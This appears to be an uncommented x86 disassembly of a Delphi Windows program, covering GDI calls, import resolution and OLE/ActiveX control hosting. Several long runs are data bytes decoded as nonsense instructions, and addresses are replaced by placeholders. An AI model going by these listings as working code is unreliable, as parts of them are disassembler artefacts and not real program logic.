mov [ ebx + 0x4 ] eax
neg [ ebx + 0x4 ]
push 0x1
push ebx
push esi
call LPtoDP
push esi
push 0x0
call ReleaseDC
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_479370
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4793a0
mov edx eax
lea ecx [ esp + 0x8 ]
xor eax eax
call sub_417744
lea eax [ esp + 0x8 ]
mov edx esp
call sub_479328
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4793a0
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4793bc
push ecx
xor edx edx
mov [ esp ] edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_4793d8
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov edx [ esp ]
sub_4793f4
push ecx
xor edx edx
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov eax edx
pop edx
retn
push esp
mov eax [ eax + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x40 ]
test [ esp ] 0x2
setne dl
sub_479414
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_4793bc
lea ecx [ esp + 0x8 ]
xor edx edx
call sub_417744
lea eax [ esp + 0x8 ]
mov edx esp
call sub_479328
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_479458
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_479496
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_479440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47949d
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_4794a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x28 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ ebx + 0x28 ]
push eax
mov eax [ eax ]
call [ eax + 0x24 ]
call sub_4771f4
sub_4794c0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4794fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_479440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479505
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_47950c
push ebx
push esi
mov esi edx
mov ebx eax
push r-xdata
lea eax [ ebx + 0x28 ]
call sub_4058a0
push eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421de4
test eax eax
je r-xdata
or ecx 0xffffffff
xor edx edx
call sub_4797ac
call sub_4771f4
pop esi
pop ebx
retn
sub eax 0xffffffec
sub_479549
add [ eax ] al
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4795c3
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_421de4
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x28 ]
mov ecx r-xdata
call sub_4058e4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4771f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4795ca
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub eax 0xffffffec
sub_4795cf
add [ ecx ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47961f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_479440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479626
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_47962c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47966b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_479440
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479672
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_479678
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d604
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_479784
push ebp
mov ebp esp
push ebx
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
mov ebx [ ebp + 0x8 ]
push ebx
push ecx
push edx
push eax
call [ rw-data ]
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_4797ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_405914
xor eax eax
push ebp
push sub_47980b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x8000ffff
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
push eax
call [ rw-data ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479812
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_47981c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_479871
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479878
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x10
mov eax [ rw-data ]
push eax
call SendMessageA
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4798a0
push 0xef004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add al dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add cl dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add dl dl
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add bl dl
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4798ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4798f4
retn
sub_479948
sub [ ecx - 0x66ccffb9 ] ebx
inc edi
add [ 0x1004799 ] bh
cdq
inc edi
add [ ebx ] cl
cdq
inc edi
add [ 0x1f004799 ] dl
cdq
inc edi
add [ edx ] al
add [ eax ] al
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec eax
cdq
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec eax
cdq
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cdq
inc edi
add [ ecx + ebx * 4 + 0x47 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
cdq
inc edi
add [ eax + eax ] cl
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push cs
push esp
inc ebp
jbe r-xdata
add [ esp + 0x4 ] 0xfffffdb0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0xe0 ]
outsb
je r-xdata
add al 0xb4
std
imul esi [ ebx + 0x70 ] 0x68637461
nop
int3
sub_479f74
mov bl [ esi + 0x47 ]
add [ eax ] al
mov al [ 0x300047a0 ]
mov eax [ 0x47 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
loop r-xdata
pushad
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] bl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sahf
inc edi
add [ edx + eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sbb [ ebp + 0x24c0047 ] 0x0
add [ eax ] al
add [ eax ] al
add [ ebx + 0x479fbcc0 ] cl
add [ edx + 0x479e ] cl
add [ eax ] al
add [ eax + 0x300047a0 ] ah
inc edi
add [ eax ] ah
mov eax [ 0x2680047 ]
add [ eax ] al
fcom [ edi ]
inc ebp
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax - 0x7bffb854 ] bl
xor [ eax ] eax
mov al [ 0xffffffffd4004031 ]
movsd [ edi ] [ esi ]
inc edi
add [ esi + ecx * 8 + 0x45 ] dl
add [ eax - 0x53 ] dl
inc edi
add al bl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ ebx + eax * 4 ] bh
inc ebp
add [ eax + edi * 4 ] bh
inc edi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ eax - 0x3b ] dl
inc edi
add [ eax - 0x5d ] ch
inc edi
add [ eax - 0x37 ] ch
inc ebp
add [ esi + ecx * 8 - 0x322fffbb ] al
inc ebp
add [ eax + 0x2800454d ] dl
les eax [ ebp ]
dec eax
les eax [ ebp ]
sub cl al
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
rcl [ ebp + eax * 2 + 0x47abf400 ] 0x1
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ esi + ebp * 4 - 0x691bffb9 ] bh
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] bl
mov ebp 0xb4d00047
inc edi
add [ eax ] ah
sub al [ eax ]
mov al 0xb5
inc edi
add [ eax ] ch
lodsd [ esi ]
inc edi
add [ esp + ecx * 8 - 0x315bffb9 ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x2180041 ] dh
add [ eax ] al
enter 0x415c 0x0
sbb al 0x2
add [ eax ] al
xchg esp eax
pop esp
inc ecx
add [ eax ] ah
add al [ eax ]
add ah al
adc [ eax ] eax
and al 0x2
add [ eax ] al
add al 0x5d
inc ecx
add [ eax ] ch
add al [ eax ]
add [ esp + ebx * 2 + 0x41 ] bl
add [ edx + eax ] ch
add [ eax ] al
sbb al 0x5c
inc ecx
add [ eax ] dh
add al [ eax ]
add [ edx ] cl
add [ eax + eax ] dl
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
inc [ ecx + eax * 8 ]
inc edi
add [ ecx + eax * 8 ] ah
inc edi
add [ ecx + eax * 8 - 0x3e0fffb9 ] dl
inc edi
add [ edx + eax * 8 + 0x47 ] dh
add [ eax ] al
retn
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x24004559 ] ch
mov ecx 0x5c340047
inc ebp
add al ah
pop edx
inc ebp
add [ edi + edi * 4 ] dl
inc edi
add [ eax - 0x4bffba83 ] cl
rol [ ebp ] 0x70
retn 0x45
add [ edi * 2 + 0x581c0045 ] al
sub_47a040
sub al 0xb7
inc edi
add [ edx + eax * 8 + 0x45 ] dl
add [ ebx + eax * 4 - 0x75b7ffbb ] dh
inc ebp
add al ch
xchg edi eax
inc ebp
add ah dl
xchg ecx eax
inc ebp
add al dl
xchg esp eax
inc ebp
add ah dh
stosd [ edi ]
inc edi
add [ eax - 0x7bffba68 ] al
cwde
inc ebp
add [ esi + ebp * 4 - 0x691bffb9 ] bh
inc ebp
add [ ebx + eax * 8 - 0x5ed3ffbb ] dl
inc ebp
add [ ebp + edx * 8 + 0x45 ] al
add al bl
mov edi 0xc3000045
inc ebp
add [ eax ] bl
mov ebp 0xb4d00047
inc edi
add [ eax ] ah
sub al [ eax ]
mov al 0xb5
inc edi
add [ eax ] ch
lodsd [ esi ]
inc edi
add [ esp + ecx * 8 - 0x315bffb9 ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ ebx + ebx * 2 + 0x2180041 ] dh
add [ eax ] al
enter 0x415c 0x0
sbb al 0x2
add [ eax ] al
xchg esp eax
pop esp
inc ecx
add [ eax ] ah
add al [ eax ]
add ah al
adc [ eax ] eax
and al 0x2
add [ eax ] al
add al 0x5d
inc ecx
add [ eax ] ch
add al [ eax ]
add [ esp + ebx * 2 + 0x41 ] bl
add [ edx + eax ] ch
add [ eax ] al
sbb al 0x5c
inc ecx
add [ eax ] dh
add al [ eax ]
add [ edx ] cl
add [ eax + eax ] dl
verw [ ebx ]
mov al 0xd
mov al 0xc
mov al 0xe
mov al 0x5
mov al 0x29
mov al 0x2a
mov al 0xd1
inc [ ecx + eax * 8 ]
inc edi
add [ ecx + eax * 8 ] ah
inc edi
add [ ecx + eax * 8 - 0x3e0fffb9 ] dl
inc edi
add [ edx + eax * 8 + 0x47 ] dh
add [ eax ] al
retn
sub_47a154
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_47a192
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x4 ]
call sub_4785f4
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_413674
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a199
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_47a1a0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47a1fd
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_413238
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_4058e4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_478644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a204
lea eax [ ebp - 0x8 ]
call sub_4058a0
lea eax [ ebp - 0x4 ]
call sub_4058a0
retn
sub_47a21c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_40f220
mov eax esi
call sub_404d78
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
pop esi
pop ebx
retn
sub_47a260
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x208 ]
add eax 0x10
push eax
push esi
call IsEqualGUID
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax 0x80004002
mov ecx edi
mov edx r-xdata
mov eax ebx
call sub_4032a0
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_47a320
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi 0xfffffda1
jl r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xcc ]
cmp esi 0xfffffda8
jg r-xdata
mov ecx [ ebp + 0x1c ]
mov edx esi
mov eax [ edi + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc8 ]
jmp r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x24
sub_47a368
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458074
or [ ebx + 0x24 ] 0x2
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
mov eax [ ebx + 0x208 ]
inc [ eax + 0x48 ]
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x34 ] 0x0
jle r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ ebx + 0x208 ]
cmp [ eax + 0x3c ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x240 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x34 ]
mov eax esi
call sub_418fbc
mov eax [ ebx + 0x240 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_47a23c
mov [ ebx + 0x210 ] eax
mov eax ebx
call sub_47a9dc
mov edx [ ebx + 0x218 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd4 ]
lea eax [ ebx + 0x23c ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x58 ]
call sub_4771f4
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x2
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x244 ] esi
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0x3c ]
mov eax esi
call sub_418fbc
mov eax [ ebx + 0x244 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
lea eax [ ebx + 0x21c ]
call sub_4058a0
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4771f4
test [ ebx + 0x23d ] 0x4
je r-xdata
test [ ebx + 0x23e ] 0x2
jne r-xdata
inc edi
xor esi esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245d4
mov ecx eax
mov eax [ ebx + 0x240 ]
mov edx esi
call sub_418f10
inc esi
dec edi
jne r-xdata
test [ ebx + 0x23e ] 0x1
je r-xdata
xor edx edx
mov eax ebx
call sub_45596c
mov eax ebx
test eax eax
je r-xdata
mov eax [ ebx + 0x208 ]
test [ eax + 0x44 ] 0x1
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42776c
mov ecx eax
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_418f10
mov eax [ ebx + 0x244 ]
mov edx esi
call sub_418dc4
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_47b604
inc esi
dec edi
jne r-xdata
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
push eax
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4771f4
sub eax 0xfffffd9c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
test [ ebx + 0x23d ] 0x60
sete dl
mov eax ebx
call sub_45c5b4
push ebx
call sub_47c604
call sub_4771f4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
sub_47a59c
push ebx
push esi
push edi
mov esi eax
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi ]
call sub_4031ec
xor eax eax
mov [ esi ] eax
inc ebx
xor edi edi
mov eax [ esi ]
mov edx edi
call sub_418dc4
call sub_4031ec
inc edi
dec ebx
jne r-xdata
sub_47a5d4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47bc28
cmp [ esi + 0x218 ] 0x0
je r-xdata
mov eax esi
call sub_47adf4
mov eax esi
call sub_47ae9c
lea eax [ esi + 0x21c ]
call sub_4058a0
cmp [ esi + 0x218 ] 0x0
je r-xdata
push 0x1
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ esi + 0x218 ]
call sub_4058a0
mov eax [ esi + 0x210 ]
call sub_4031ec
lea eax [ esi + 0x240 ]
call sub_47a59c
lea eax [ esi + 0x244 ]
call sub_47a59c
mov eax [ esi + 0x208 ]
dec [ eax + 0x48 ]
mov eax [ esi + 0x208 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
push 0x0
mov eax [ esi + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_458198
test bl bl
jle r-xdata
mov eax esi
call sub_47ae5c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_47a694
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a934
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a93b
lea eax [ ebp - 0xc ]
call sub_4058a0
lea eax [ ebp - 0x8 ]
call sub_4058a0
retn
xor eax eax
push ebp
push sub_47a8ff
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4036cc#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
call sub_4058a0
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4771f4
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x214 ]
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
push 0x0
push ebx
call CreateStreamOnHGlobal
call sub_4771f4
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
call sub_4771f4
mov eax [ ebp - 0x4 ]
call sub_47ae9c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ eax ]
call [ eax + 0x20 ]
call sub_4771f4
jmp r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_477400
mov eax [ ebp - 0x4 ]
add eax 0x238
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x210 ]
test ecx ecx
je r-xdata
sub ecx 0xfffffdb4
mov eax [ ebp - 0x4 ]
add eax 0x220
call sub_4058a0
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4771f4
mov eax [ ebp - 0x4 ]
add eax 0x224
call sub_4058a0
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
call sub_4771f4
mov eax [ ebp - 0x4 ]
add eax 0x228
call sub_4058a0
push eax
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
mov eax [ ebp - 0x4 ]
add eax 0x234
push eax
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
call sub_477400
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
sub ecx 0xfffffff8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
push 0xfffffe0b
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
push 0xfffffdfe
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
push 0xfffffe00
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
call sub_47c604
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0xfffffdff
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0xdc ]
sub_47a984
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
mov ebx edx
cmp eax 0x80040112
jne r-xdata
call sub_4771f4
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_40313c
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb48
call sub_4039b8
sub_47a9dc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47aaf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
push ebp
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_4058a0
push eax
push r-xdata
push 0x5
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoCreateInstance
pop edx
call sub_47a984
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_4058a0
push eax
push r-xdata
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
push eax
call CoGetClassObject
call sub_4771f4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x208 ]
mov edx [ edx + 0x28 ]
call sub_40476c
push ebp
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
add eax 0x218
call sub_4058a0
push eax
mov eax [ ebp - 0xc ]
push eax
push r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
pop edx
call sub_47a984
pop ecx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47aafd
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403fa0
lea eax [ ebp - 0xc ]
call sub_40465c
